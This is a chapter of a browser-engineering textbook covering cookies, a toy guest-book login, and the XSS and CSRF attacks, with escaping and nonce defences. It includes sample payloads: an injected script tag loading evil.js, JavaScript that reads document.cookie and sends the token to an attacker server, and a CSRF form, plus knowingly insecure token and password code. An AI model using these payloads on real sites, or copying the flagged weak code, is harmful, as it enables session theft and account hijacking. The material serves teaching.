---
title: Keeping Data Private
chapter: 10
prev: scripts
next: reflow
...

Our browser has grown up and now runs (small) web applications. Let's
take the final step and add user identity to our browser via cookies.
Capability demands responsibility: our browser must then secure
cookies against adversaries interested in getting at them.

::: {.warning}
Web browser security is a vast topic. It involves securing the web
browser, securing the network, and securing the applications that the
browser runs. It also involves educating the user, so that attackers
can't misleading them into revealing their own secure data. This chapter
can't cover all of that. Instead, it focuses on the mechanisms browsers
have developed to protect the security of web applications. *So*, if
you're writing security-sensitive code, this book is not enough.
:::

Cookies
=======

With what we've implemented so far there's no way for a web server to
tell whether two HTTP requests come from the same browsers, or
different ones. Our web browser is effectively anonymous.[^1] That
means it can't "log in" anywhere, because there's no way for the
server to know which later requests come from the logged in browser
and which come from some unrelated browser.

The web fixes this problem with cookies. A cookie---the name is
meaningless, ignore it---is a little bit of information stored by your
browser on behalf of a web server. The cookie establishes that
browser's identity and allows the server to distinguish one web
request from another.

[^1]: I don't mean anonymous against malicious attackers, who might
    use *browser fingerprinting* or similar techniques to tell users
    apart. I mean anonymous in the good-faith sense.


Here's how cookies work. A web server, when it sends you an HTTP
response, can add a `Set-Cookie` header. This header contains a
key-value pair; for example, the following header sets
the `foo` to `bar`:

    Set-Cookie: foo=bar
    
The browser remembers this key-value pair, and the next time it makes
a request to the same server (cookies are site-specific) it echoes it
back in the `Cookie` header:

    Cookie: foo=bar

Servers can also set multiple cookies and also set parameters like
expiration dates, but this `Set-Cookie` / `Cookie` mechanism is the
core principle.

Before we start implementing cookies, let's see how they're used by
implementing a login system for our guest book. That's going to
require is using cookies to create identities for all the browsers
using our website.

Let's have each browser identified by a long random number stored in
the `token` cookie. When a request is made to the guest book, we'll
either extract a token from the `Cookie` header, or generate a new
one:[^secure-random]

[^secure-random]: This use of `random.random` returns a decimal number
    with 53 bits of randomness. That's not great; 256 bits is ideal.
    And `random.random` is not a secure random number generator: by
    observing enough tokens you can predict future values and use
    those to hijack accounts. A real web application must use a
    cryptographically secure random number generator for tokens.

``` {.python file=server}
import random

def handle_connection(conx):
    # ...
    if "cookie" in headers:
        token = headers["cookie"][len("token="):]
    else:
        token = str(random.random())[2:]
    # ...
```

This code should go after all the request headers are parsed, but
before we actually handle the request in `do_request`.

Of course, if we just generated a random token, we need to tell the
browser to remember it:

``` {.python file=server}
def handle_connection(conx):
    # ...
    if 'cookie' not in headers:
        response += "Set-Cookie: token={}\r\n".format(token)
    # ...
```

This code should go after `do_request`, when the server is assembling
the HTTP response.

We can use those identities to store information about each browser
using our website. Let's do that on the server side,[^cookies-limited]
in a variable called `SESSIONS`:

[^cookies-limited]: Browsers and servers both limit header lengths, so
    it's best not to store variable-sized data in cookies. Plus,
    cookies are sent back and forth on every request, so long cookies
    mean a lot of useless traffic.

``` {.python file=server}
SESSIONS = {}

def handle_connection(conx):
    # ...
    session = SESSIONS.setdefault(token, {})
    status, body = do_request(session, method, url, headers, body)
    # ...
```

Note that I'm passing the user information as the first argument to
`do_request`. Let's also make sure to pass that session information to
individual pages like `show_comments` and `add_entry`:

``` {.python file=server}
def do_request(session, method, url, headers, body):
    if method == "GET" and url == "/":
        return "200 OK", show_comments(session)
    # ...
    elif method == "POST" and url == "/add":
        params = form_decode(body)
        return "200 OK", add_entry(session, params)
    # ...
```

You'll also need to modify the `add_entry` and `show_comments`
signatures, and also the call to `show_comments` inside `add_entry`.

With the guest book server storing information about each user
accessing the guest book, we can now build a login system.

A login system
==============

I want users to log in before posting to the guest book. Nothing
complex, just the minimal functionality:

- Users have to be logged in to add guest book entries.
- The server will display who added which guest book entry.
- Users will log in with a username and password.
- The server will hard-code a set of valid logins.

Let's start coding. First, we'll need to store usernames in `ENTRIES`:[^3]

[^3]: The seed comments reference 1995's *Hackers*.
    [Hack the Planet!](https://xkcd.com/1337)

``` {.python file=server}
ENTRIES = [
    ("No names. We are nameless!", "cerealkiller"),
    ("HACK THE PLANET!!!", "crashoverride"),
]
```

When we print the guest book entries, print the username as well:

``` {.python file=server}
def show_comments(session):
    # ...
    for entry, who in ENTRIES:
        out += '<p>' + entry + " <i>from " + who + '</i></p>'
    # ...
```

We'll remember whether a user is logged in using the `user` key in the
session data:

``` {.python file=server}
def show_comments(session):
    # ...
    if "user" in session:
        out += "<form action=add method=post>"
        out +=   "<p><input name=guest></p>"
        out +=   "<p><button>Sign the book!</button></p>"
        out += "</form>"
    else:
        out += "<a href=/login>Sign in to write in the guest book</a>"
    # ...
```

We'll require that users be logged in before they can post comments:

``` {.python file=server}
def add_entry(session, params):
    if "user" in session and 'guest' in params and len(params['guest']) <= 100:
        ENTRIES.append((params['guest'], session["user"]))
    return show_comments(session)
```

Finally, let's work on actually logging in and out. To log in, users
will go to the `/login` URL:

``` {.python file=server}
def do_request(session, method, url, headers, body):
    # ...
    elif method == "GET" and url == "/login":
        return "200 OK", login_form(session)
    # ...
```

That URL will show a form with a username and a password field:[^4]

[^4]: I've given the `password` input area the type `password`, which
    in a real browser will draw stars or dots instead of showing what
    you've entered, though our browser doesn't do that.

``` {.python file=server}
def login_form(session):
    body = "<!doctype html>"
    body += "<form action=/login method=post>"
    body += "<p>Username: <input name=username></p>"
    body += "<p>Password: <input name=password type=password></p>"
    body += "<p><button>Log in</button></p>"
    body += "</form>"
    return body 
```

Note that the form sends its data to `/login` as well, but using a
`POST` request. Let's send those requests to a separate function:

``` {.python file=server}
def do_request(session, method, url, headers, body):
    # ...
    elif method == "POST" and url == "/login":
        params = form_decode(body)
        return do_login(session, params)
    # ...
```

That `do_login` function will check passwords and log people in by
storing their user name in the session data:[^timing-attack]

[^timing-attack]: Actually, using `==` to compare passwords like here
    is a bad idea: Python's equality function for strings scans the
    string from left to right, and exits as soon as it finds a
    difference. So, *how long* it takes to check passwords gives you
    clues about the password; this is called a "timing side channel".
    I'm not worrying about that here, because this book is really
    about the browser, not the server---but a secure web application
    would have to fix it!

``` {.python file=server}
def do_login(session, params):
    username = params.get("username")
    password = params.get("password")
    if username in LOGINS and LOGINS[username] == password:
        session["user"] = username
        return "200 OK", show_comments(session)
    else:
        out = "<!doctype html>"
        out += "<h1>Invalid password for {}</h1>".format(username)
        return "401 Unauthorized", out
```

Try it out in a normal web browser. You should be able to go to the
main guest book page, click the link to log in, use one of the
username/password pairs above, and post entries.^[The login flow slows
down debugging. You might want to add the empty string as a
username/password pair.] Of course, this login system has a whole slew
of insecurities.[^7] But the focus of this book is the browser, not
the server, so once you're sure it's all working, let's switch gears
and implement cookies inside our own browser.

[^7]: I should be hashing passwords! Using `bcrypt`! We should verify
    email addresses! Over TLS! We should run the server in a sandbox!


Implementing cookies
====================

Let's implement cookies. To start with, we need a place to store
cookies; that database is traditionally called a *cookie jar*[^2]:

[^2]: Because once you have one silly name it's important to stay
    on-brand.

``` {.python}
COOKIE_JAR = {}
```

Note that the cookie jar is global, not limited to a particular tab.
That makes sense: in a browser, if you're logged in to a website and
you open a second tab, you're logged in on that tab as well.

Remember that cookies are site-specific---each cookie is bound to the
host and port that set it. So our cookie jar will map host/port pairs
to cookies.

When the browser visits a page, it needs to send all the cookies it
knows about. This means adding an extra header to the
request:[^multi-cookies]

[^multi-cookies]: Actually, a site can store multiple cookies at once,
    using different key-value pairs. The browser is supposed to
    separate them with semicolons. I'll leave that for an exercise.

``` {.python}
def request(url, payload=None):
    # ...
    origin = (host, port)
    if origin in COOKIE_JAR:
        body += "Cookie: {}\r\n".format(COOKIE_JAR[origin])
    # ...
```

So that handles sending the `Cookie` header. Receiving the
`Set-Cookie` header, meanwhile, should update the cookie
jar:[^multiple-set-cookies]

[^multiple-set-cookies]: A server can actually send multiple
    `Set-Cookie` headers to set multiple cookies in one request. I'm
    not implementing this here, but a good browser would.

``` {.python}
def request(url, payload=None):
    # ...
    if "set-cookie" in headers:
        kv = headers["set-cookie"]
        COOKIE_JAR[origin] = kv
    # ...
```

This should work: you should now be able to use your toy browser to
log in to the guest book and post to it. Moreover, you should be able
to open the guest book in two browsers simultaneously---maybe your toy
browser and a real browser as well---and log in and post as two
different users.

Note that `load` calls `request` three times (for the HTML, CSS, and
JS files). Because we handle cookies inside `request`, this should
automatically work correctly, with later requests transmitting cookies
set by previous responses.

------------------------------

::: {.todo}
Everything below here has not been edited and might not match perfectly.
:::

Cross-site scripting
====================

Sure, the origin is uniquely owned by our web server, so there's no way
some other web server could see the headers the server and browser send
to each other.[^11][^12][^13][^14]

But that's not the only way to read cookies! In fact, cookies are
accessible from JavaScript as well, through the `document.cookie` field.
This field is a string, containing the same contents as the `Cookie`
header value. We can implement that pretty simply. First, in
`runtime.js`:

``` {.javascript}
Object.defineProperty(document, 'cookie', {
    get: function() { return call_python("cookie"); }
})
```

Now we register `cookie` to a simple function that returns the cookie
value:

``` {.python}
class JSContext:
    def __init__(self, tab):
        # ...
        self.interp.export_function("cookie", self.cookie_string)
        # ...
```

Accessing cookies from JavaScript may seem benign, since the
JavaScript being run, in `comment.js`, is our own and won't do
anything malicious. And this is true, if our users cooperate. But web
services sometimes turn into battlegrounds between users. And consider
the code we wrote to output guest book entries:

``` {.python expected=False}
out += '<p>' + entry + ' <i> from ' + who + '</i></p>'
```

Note that `entry` can be anything, anything the user might stick into
our comment form. "Anything" might even include a user-written
`<script>` tag! Let's imagine that you're logged in as one user, maybe
`crashoverride`, but would like to gain access to another username,
maybe `nameless`. You could post the comment:

``` {.example}
Hi! <script src=http://my-server/evil.js></script>
```

Our server would then output the HTML:[^15]

[^15]: A real browser would use form-encoding to transmit all of these
    special characters. Our browser's form-encoding is very limited,
    but this comment does go through.

``` {.example}
<p>Hi! <script src=http://my-server/evil.js></script>
<i> by crashoverride</i></p>
```

That would cause our browser to download the `evil.js` script.[^16] So
`evil.js` could access `document.cookie` and do something evil.

[^16]: Yes: real browsers, just like our toy browser, will download
    and run JavaScript from any source, including from other servers
    and origins, and they all run with the same permissions. This is
    how JavaScript libraries usually work!

Let's try it out. Post the above comment, except instead of
`my-server` use `localhost:9000`, where we'll create a server with:

``` {.example}
python3 -m http.server 9000
```

That runs Python's built-in HTTP server on port 9000; it'll respond to
`localhost:9000/<file>` with the contents of `<file>` in the current
directory. Let's fill `evil.js` with the following contents:

``` {.javascript}
token = document.cookie.split("=")[1]
body = document.querySelectorAll("body")[0]
url = "http://localhost:9000/" + token
body.innerHTML = "<a href=" + url + ">Click to continue</a>"
```

That replaces the whole web page with a single link. When the user
clicks that link,[^17] their browser sends the evil web server the
token value, embedded in the request URL. Our evil server records
that, and the game is up! In a more feature-full browser, the link
could be hidden. The attacker could make an `XMLHttpRequest`,[^18] add
an image to the page that the browser will try to load (from our evil
server), load JavaScript from our evil domain, or anything else like
that. Even with the extremely limited DOM API our browser supports, we
could better hide our evildoing:

[^17]: You've seen "please click to continue" screens and have clicked
    the button unthinkingly. Your users will too.

[^18]: Scripts aren't allowed to read data from XHRs to another
    origin, but the browser still makes the request.


``` {.javascript}
form = document.querySelectorAll("form")
url = "http://localhost:9000/" + token
newform = "<form action=" + url + " method=get>"
newform += "<p><input name=guest></p>"
newform += "<p><button>Sign the book!</button></p>"
newform += "</form>"
form.innerHTML= newform
```

This replaces the contents of the comment form with a new form (so it's
a form in a form, with the inner form taking priority) that submits both
the new comments and the login token to our evil server.

Try these exploits out, both in our toy browser and in a real one.

The core problem behind these problems is that user comments are
supposed to be data, but the browser is interpreting them as code. This
kind of exploit is usually called *cross-site scripting*, shortened to
XSS, though the data-misinterpreted-as-code issue is a fairly broad one
that occurs in many, many systems.

Anyway, whatever it's called, we need to fix it, and the way we do that
is not sending `entry`, the user comment, directly to the browser.
Instead, we'd do something to ensure the browser would not interpret it
as code, something like:

``` {.python expected=False}
def html_escape(text):
    return text.replace("&", "&amp;").replace("<", "&lt;")

def show_comments(username):
    # ...
    out += "<p>" + html_escape(entry)
    out += " <i>from " + html_escape(who) + "</i></p>"
    # ...
```

Now the comment would would be printed as the code `&lt;script`,
instead of as a literal script tag, so the browser will interpret it
as text, not a tag,[^19] and won't run any code inside. Success! Most
languages that you might write a web server in come with helper
functions to do this escaping for you.[^python-html]

[^python-html]: In Python, use the `html` module's `escape` method. In
    JavaScript, use `textContent` instead of `innerHTML` when you
    don't intend to add HTML content.

I should add that there are other approaches to this bug. You could
remove tags instead of escaping the angle bracket. You could prevent
users from submitting comments with "invalid characters". You could do
the character replacing before saving the entry, instead of before
showing the entry. These are all worse than escaping:

-   Removing tags means implementing the quirky HTML parsing algorithm.
-   Preventing comments with tags has the same issue, and you need to
    do the same check on the server and the client side. Plus, you
    might write too tight a filter and prevent users from sending
    something benign, like old-school heart emoticons `<3`.
-   Saving the character-replaced entry assumes you'll only consume
    the entry in HTML. Your server might later want to use that data
    in [JSON](https://www.json.org/) (you'll need to escape single quotes), or raw JavaScript
    (you'll need to escape `</script>`), or JSON embedded in
    JavaScript embedded in HTML. Data should be a single source of
    truth, not a place to store mangled HTML.

You might want to escape some more characters, like replacing double
quotes with `&quot;` if you plan to stick user data into HTML
attributes, but the method above is roughly correct in general concept.

Cross-site request forgery
==========================

Thanks to the same-origin policy and the mitigations for cross-site
scripting, it's now hard for an evil-doer to steal the login token
from our browser. But that doesn't leave us totally safe. Another
concern is our browser misusing the token. One popular exploit of this
type is called *cross-site request forgery*, often shortened to CSRF.

In cross-site request forgery, the attack does not involve the user
going to our guest book site at all. Instead, the user begins on our
evil-doer's website.[^20] That website has a form analogous to the
guest-book form:

``` {.html}
<form action=http://localhost:8000/add method=post>
  <p><input name=guest></p>
  <p><button>Sign the book!</button></p>
</form>
```

Our browser (and a real one) does not care what origin a form is on:
you can submit a form on one origin to another origin, and this
ability is widely used for some reason.[^21] So even if the user fills
out this form on the evil website, the form is still submitted to
the guest-book. When the browser makes that POST request to the
guest-book, it will *also* send along its guest-book cookie. Since the
user has no idea where a form is going---the browser does not show
them that information---they might want to sign a guest book on the
evil-doer's site and end up signing the one on our server
instead.^[And thank goodness we never implemented a change-of-password
form!]

But it gets worse! Suppose the form isn't actually like that, and
instead looks like this:

``` {.html}
<form action=http://localhost:8000/add method=post>
  <p><button>Click me!</button></p>
</form>
```

People will do all sorts of stuff, so they might click that
button.[^you-too] And it may look safe, since there's no `guest` input
area. However, there might be some sneaky JavaScript attached:

[^you-too]: You have clicked similar buttons. Admit it.

``` {.javascript}
form  = document.querySelectorAll('form')[0]
form.addEventListener("submit", function() {
    comment = "Buy from my website: http://evil.doer/";
    input = "<input name=guest value=\"" + comment + "\">";
    form.innerHTML = input;
})
```

This script waits for the user to click the button, and then replaces
the form contents with a `guest` input area with a pre-filled value.
The browser then finds it when it looks for input areas and submits
our hard-coded guest-book entry to the guest-book server. And
remember: the form is submitted by the user's browser, with the user's
cookies, so the post will succeed (if the user is logged in to the
guest book). Posting a comment this way is not too scary (though shady
advertisers will pay for it!) but posting a bank transaction is.

Try it! This should work in both ours and in a real browser. Plus, in a
real browser you could also have a "hidden" input element, which would
mean that you don't need to write any tricky JavaScript at all.

How do we defend against this attack?

We want to make sure that every POST request to `/add` comes from a form
on our website. The normal way to ensure that is to embed a secret
value, called a *nonce*, into the form, and to reject form submissions
that don't come with this secret value.

A nonce is like a login token, but instead of getting it on login, you
get a new one every time you're presented with a form to fill out. In
some sense, it's like a cookie, except that it's stored inside the
HTML and thus lasts for just one request (instead of across many
requests to the same server), so it can't be misused in the same way.

Let's implement nonces in our guest book. Generate a secret nonce and
add it to the form:

``` {.python expected=False}
def show_comments(username):
    # ...
    if username:
        nonce = str(random.random())[2:]
        out += "<form action=add method=post>"
        out +=   "<p><input name=nonce type=hidden value=" + nonce + "></p>"
        # ...
```

The `hidden` input type basically instructs a browser not to render the
input area, but to still submit it in the form. In our browser, which
doesn't support hidden input elements, this will show up as an input
area with a random string of digits---not ideal, but as long as you
don't touch it form submission will work fine.

We'll also need to save the nonce so that we can tell valid from
invalid nonces. I'm going to store that in a `NONCES` variable, which
will store one nonce per user. We'll then check both that the nonce is
valid and also that it is associated with the correct user:[^22]

[^22]: Otherwise an attacker could get a nonce for *their* account and
    then use in a CSRF attack for another user's submission.

``` {.python expected=False}
def show_comments(username):
    # ...
    if username:
        nonce = str(random.random())[2:]
        NONCES[username] = nonce
```

When the form is submitted, we will check the nonce:

``` {.python expected=False}
def add_entry(params, username):
    if not check_nonce(params, username):
        return "Invalid nonce", {}
    # ...

def check_nonce(params, username):
    if 'nonce' not in params: return False
    if username not in NONCES: return False
    return params['nonce'] == NONCES[username]
```

Thanks to this change, in order to add an entry to the guest book, you
need to be logged in and submit the form on the guest book page itself.
And that's a form that we, as the guest book authors, have sole control
over (thanks to our XSS mitigations), so the form submission has now
been secured. Or... I keep saying there's more to security than what's
in this book. Let's just settle for this fact: the guest book is now
more secure than before.

::: {.warning}
The purpose of this book is to teach the *internals of web browsers*,
not to teach web application security. There's much more you'd want
to do to make this guest book truly secure, let alone what we'd need
to do to avoid denial of service attacks or to handle spam and
malicious use.
:::

Summary
=======

We've added user data, in the form of cookies, to our browser, and
immediately had to bear the heavy burden of securing that data and
ensuring it was not misused. We then saw the rich browser features we
developed turn into attack vector. And we've made with some simple
tweaks to our guest book to prevent two common web application
vulnerabilities.

Exercises
=========

*Hidden input*: Add support for hidden input elements. Since they
don't need to be laid out, there's no need for a layout type at all!

*Cookie Expiration*: Add support for cookie expiration. Cookie
expiration dates are set in the `Set-Cookie` header, and can be
overwritten if the same cookie is set again with a later date. Save
the same expiration dates in the `TOKENS` variable and use it to
delete old tokens to save memory.

*Cookie Origins*: Add support for cookie origins. Due to the
same-origin policy, a cookie set by `mail.google.com` cannot be read
by, say, `calendar.google.com`, because the host name is the same.
This is a good default,[^23] but is sometimes annoying. A server can
set an `origin` parameter in the `Set-Cookie` header to strip off some
subdomains from the cookie origin. Implement this in your browser,
making sure to send these generalized-origin cookies on any requests
covered by the generalized origin.

*Content Security Policy*: The `Content-Security-Policy` header is a
powerful tool in modern browsers to prevent XSS attacks. The full
specification is quite complex, but in the simplest case, the header
is set to the keyword `default-src` followed by a space-separated list
of origins. That instructs the browser to refuse to load any resources
for that page (CSS, JavaScript, images, and so on) except from those
origins. Implement support for this header.

*Referer*: When your browser visits a web page, or when it loads a CSS
or JavaScript file, it sends a `Referer` header[^24] containing the
URL it is coming from. Sites often use this for analytics. Implement
this in your browser. However, some URLs contain personal data that
they don't want revealed to other websites, so browsers support a
`Referer-Policy` header, which can contain values like `no-referer`
(never send the `Referer` header when leaving this page) or
`same-origin` (only do so if navigating to another page on the same
origin). Implement those two values for `Referer-Policy`.

[^11]: Well... Our connection isn't encrypted, so an attacker could
    pick up the token from there. But another *server* couldn't.

[^12]: Well... Another server could hijack our DNS and redirect our
    hostname to a different IP address, and then steal our cookies. But
    some ISPs support DNSSEC, which prevents that.

[^13]: Well... A state-level attacker could announce fradulent BGP
    routes, which would send even a correctly-retrieved IP address to
    the wrong physical computer.

[^14]: Security is very hard.

[^19]: In a real browser, that code will be displayed as a literal
    less-than sign followed by the word `script`, but in our browser,
    this won't happen, unless you did the relevant exercise in [Chapter
    4](html.md).

[^20]: Why is the user on the attacker's site? Perhaps it has funny
    memes, or it's been hacked and is being used for the attack
    against its will, or perhaps the evil-doer paid for ads on sketchy
    websites where users have low standards for security anyway.

[^21]: For example, search forms that actually just direct you to a
    Google search.

[^23]: Should `microsoft.com` read `google.com`? What about
    `microsoft.co.uk` and `google.co.uk`?

[^24]: Yep, spelled that way.
